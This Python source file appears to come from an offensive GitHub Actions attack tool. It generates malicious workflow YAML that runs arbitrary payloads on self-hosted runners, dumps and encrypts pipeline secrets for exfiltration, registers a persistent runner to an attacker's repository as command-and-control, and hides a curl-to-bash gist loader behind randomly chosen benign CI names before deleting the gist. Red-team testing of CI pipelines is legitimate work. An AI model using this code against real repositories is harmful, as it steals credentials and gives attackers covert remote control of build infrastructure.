import random
import yaml

STEALTH_WORKFLOW_NAMES = [
    'ci-lint-check', 'code-quality', 'dependency-audit',
    'build-validation', 'static-analysis', 'integration-test',
    'security-scan', 'format-check', 'type-check', 'unit-test',
]


class CICDAttack():
    """Class to encapsulate helper methods for attack features. Functionality
    here will focus on data processing and payload creation/management as
    opposed to API / Git interaction.
    """

    @staticmethod
    def create_malicious_yml(payload: str, workflow_name: str = 'Testing',
                             runner_labels: list = None):
        """Creates a malicious YML file containing a shell execution payload
        that will run on the self hosted runner.

        Args:
            payload (str): Shell command to execute on the runner host as
            part of the malicious yml file.
            workflow_name (str, optional): Name of the self-hosted
            workflow that will require approval by default on
            fork pull request repositories. Default 'Testing'.
            runner_labels (list, optional): Labels for runs-on targeting.
            Defaults to ['self-hosted'].

        Returns:
            str: Workflow yaml file containing simple payload.
        """
        yaml_file = {}

        yaml_file['name'] = workflow_name
        yaml_file['on'] = ['pull_request']

        test_job = {
            'runs-on': runner_labels or ['self-hosted'],
            'steps': [
                {
                    'name': 'Run Tests',
                    'run': payload
                }
            ]
        }
        yaml_file['jobs'] = {'testing': test_job}

        return yaml.dump(yaml_file, sort_keys=False)

    @staticmethod
    def create_push_yml(payload: str, branch_name: str,
                        runner_labels: list = None):
        """Create a malicious yaml file that will trigger on push to a
        specific branch.

        Args:
            payload (str): Command to be executed as part of the 'run' payload.
            branch_name (str): Name of the branch for on: push trigger.
            runner_labels (list, optional): Labels for runs-on targeting.
            Defaults to ['self-hosted'].

        Returns:
            str: Workflow yaml file containing the payload.
        """
        yaml_file = {}

        yaml_file['name'] = branch_name
        yaml_file['on'] = {'push': {"branches": branch_name}}

        test_job = {
            'runs-on': runner_labels or ['self-hosted'],
            'steps': [
                {
                    'name': 'Run Tests',
                    'run': payload
                }
            ]
        }
        yaml_file['jobs'] = {'testing': test_job}

        return yaml.dump(yaml_file, sort_keys=False)

    @staticmethod
    def create_exfil_yaml(secrets: list, pubkey: str, branch_name):
        """Create a malicious yaml file that will trigger on push and attempt
        to exfiltrate the provided list of secrets.

        Args:
            secrets (list): List of GitHub Actions pipeline secrets.
            pubkey (str): Public key to encrypt the plaintext values with.
            branch_name (str): Name of the branch for on: push trigger.

        """
        yaml_file = {}

        secret_envmap = {}
        echo_cmd = 'echo -e "'

        for secret in secrets:
            secret_envmap.update(
                {f"{secret}": '${{ ' + f"secrets.{secret}" + ' }}'}
            )
            echo_cmd += f'{secret}=${secret} \\n'

        echo_cmd += '"'

        # variables don't support hyphens, so replace them with underscores.
        pkey_varname = f'{branch_name.replace("-", "_")}_KEY'
        secret_envmap[pkey_varname] = pubkey

        yaml_file['name'] = branch_name
        yaml_file['on'] = {'push': {"branches": branch_name}}

        test_job = {
            'runs-on': ['ubuntu-latest'],
            'steps': [
                {
                    'name': 'Run Tests',
                    'env': secret_envmap,
                    'run': "openssl rand -base64 24 | tr -d '\\n' > sym.key; echo -n '$';"
                           f"{echo_cmd} | openssl enc -aes-256-cbc -kfile "
                           "sym.key -pbkdf2 | base64 -w 0 | tr -d '\\n';"
                           f"echo '$'; echo -n '$'; cat sym.key | base64 | "
                           "openssl rsautl -encrypt -inkey "
                           f"<(echo \"${pkey_varname}\") -pubin -pkcs | "
                           "base64 -w 0 | tr -d '\\n'; echo '$'"
                }
            ]
        }
        yaml_file['jobs'] = {'testing': test_job}

        return yaml.dump(yaml_file, sort_keys=False)

    @staticmethod
    def create_ror_payload(registration_token: str, attacker_repo: str,
                           runner_version: str):
        """Generate the RoR runner installation bash payload.

        Args:
            registration_token (str): Runner registration token.
            attacker_repo (str): Attacker repo in org/repo format.
            runner_version (str): Runner release version (e.g. '2.332.0').

        Returns:
            str: Bash script payload.
        """
        return (
            'RUNNER_NAME="gato-$(hostname)-$(date +%s)"\n'
            'ARCH=$(uname -m)\n'
            'case "$ARCH" in\n'
            '  aarch64) ARCH="arm64" ;;\n'
            '  x86_64)  ARCH="x64" ;;\n'
            '  *)       echo "Unsupported arch: $ARCH"; exit 1 ;;\n'
            'esac\n'
            'RUNNER_DIR="$HOME/.gato-runner"\n'
            'mkdir -p "$RUNNER_DIR" && cd "$RUNNER_DIR"\n'
            f'curl -sL "https://github.com/actions/runner/releases/download/'
            f'v{runner_version}/actions-runner-linux-$ARCH-'
            f'{runner_version}.tar.gz" -o runner.tar.gz\n'
            'tar xzf runner.tar.gz && rm runner.tar.gz\n'
            'DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1 ./config.sh'
            f' --url "https://github.com/{attacker_repo}"'
            f' --token "{registration_token}"'
            ' --name "$RUNNER_NAME"'
            ' --labels "gato-ror"'
            ' --disableupdate'
            ' --unattended\n'
            'unset RUNNER_TRACKING_ID\n'
            'setsid ./run.sh > /dev/null 2>&1 &\n'
            'sleep 2\n'
            'echo "RoR runner installed: $RUNNER_NAME"'
        )

    @staticmethod
    def create_ror_yml(registration_token: str, attacker_repo: str,
                       runner_version: str, branch_name: str,
                       runner_labels: list = None):
        """Create a workflow that installs a GitHub Actions runner on the
        target, registered to the attacker's repo for C2.

        Args:
            registration_token (str): Runner registration token.
            attacker_repo (str): Attacker repo in org/repo format.
            runner_version (str): Runner release version (e.g. '2.332.0').
            branch_name (str): Branch for on:push trigger.
            runner_labels (list, optional): Labels for runs-on targeting.
            Defaults to ['self-hosted'].

        Returns:
            str: Workflow YAML contents.
        """
        payload = CICDAttack.create_ror_payload(
            registration_token, attacker_repo, runner_version
        )

        return CICDAttack.create_push_yml(payload, branch_name,
                                          runner_labels=runner_labels)

    @staticmethod
    def create_c2_dispatch_yml():
        """Create a workflow_dispatch workflow for C2 command execution.

        Returns:
            str: Workflow YAML contents.
        """
        yaml_file = {
            'name': 'C2',
            'on': {
                'workflow_dispatch': {
                    'inputs': {
                        'command': {
                            'description': 'Command to execute',
                            'required': True
                        }
                    }
                }
            },
            'jobs': {
                'run': {
                    'runs-on': ['self-hosted', 'gato-ror'],
                    'steps': [
                        {
                            'name': 'Execute',
                            'run': '${{ github.event.inputs.command }}'
                        }
                    ]
                }
            }
        }

        return yaml.dump(yaml_file, sort_keys=False)

    @staticmethod
    def create_stealth_yml(gist_raw_url: str, gist_id: str,
                           burner_pat: str, branch_name: str,
                           trigger: str = 'push',
                           workflow_name: str = None,
                           runner_labels: list = None):
        """Create a benign-looking workflow that fetches and executes
        payload from a GitHub Gist, then deletes the gist.

        Args:
            gist_raw_url (str): Raw URL to fetch gist content.
            gist_id (str): Gist ID for deletion after execution.
            burner_pat (str): Burner account PAT for gist API access.
            branch_name (str): Branch for trigger.
            trigger (str): 'push' or 'pull_request'. Defaults to 'push'.
            workflow_name (str, optional): Workflow name. Auto-generated
                from a list of benign CI names if not provided.
            runner_labels (list, optional): Labels for runs-on targeting.
                Defaults to ['self-hosted'].

        Returns:
            str: Workflow YAML contents.
        """
        if not workflow_name:
            workflow_name = random.choice(STEALTH_WORKFLOW_NAMES)

        yaml_file = {}
        yaml_file['name'] = workflow_name

        if trigger == 'pull_request':
            yaml_file['on'] = ['pull_request']
        else:
            yaml_file['on'] = {'push': {'branches': branch_name}}

        run_step = (
            f'curl -sH "Authorization: token {burner_pat}" '
            f'"{gist_raw_url}" | bash'
        )

        cleanup_step = (
            f'curl -sX DELETE -H "Authorization: token {burner_pat}" '
            f'"https://api.github.com/gists/{gist_id}"'
        )

        test_job = {
            'runs-on': runner_labels or ['self-hosted'],
            'steps': [
                {
                    'name': 'Run',
                    'run': run_step
                },
                {
                    'name': 'Post',
                    'if': 'always()',
                    'run': cleanup_step
                }
            ]
        }
        yaml_file['jobs'] = {'build': test_job}

        return yaml.dump(yaml_file, sort_keys=False)
